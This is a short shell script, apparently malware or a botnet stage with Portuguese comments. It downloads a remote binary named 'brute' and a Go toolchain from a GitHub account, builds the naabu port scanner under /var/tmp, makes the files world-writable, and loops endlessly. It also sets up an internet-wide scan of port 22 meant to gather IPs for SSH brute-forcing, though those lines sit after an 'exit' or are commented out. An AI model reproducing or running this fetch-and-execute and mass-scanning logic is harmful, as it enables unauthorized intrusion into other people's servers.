#ATILA_VKZMN


brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'

go='https://github.com/atilabyte/golang/raw/refs/heads/master/go.zip'

naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.zip'



brute(){


cd /var/tmp/go/bin ; cd  *.1/cmd/naabu


wget $brute_url  -O brute || curl  -L $brute_url -o brute


chmod 777 brute && chmod 777 nabu


exit


timeout   5s ./nabu  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
 
#timeout   120s    ./brute  #120  segundos para  testa o   ip

return

}




#################################
install_nabu(){

#function no critical


out_cat=$(ls  /var/tmp/go/bin/naabu-2.6.1/cmd/naabu/nabu) 

if (( ! $?  )) ; then # is 0 ?

echo "nabu  instaled ok"


brute

return


fi ; 



#--------------------------------------------------------------



if [ $EUID -eq  0 ] ; then


#apt-get   update -y  &&  apt-get  upgrade  -y   

#apt-get install -y  libpcap-dev 


cd /var/tmp 

wget $go  -O  go.zip  || curl  -L  $go  -o   go.zip

unzip  -o  go.zip  
 
cd go/bin/

wget  $naabu  -O nabu.zip   || curl -L $naabu -o nabu.zip

unzip -o *.zip 

cd  *.1/cmd/naabu ; mv main.go nabu.go


 ../../.././go  build nabu.go



exit

fi; #nao so root




}





##################

init() {

 
while true ; do

install_nabu
 
sleep   1

done


}



init




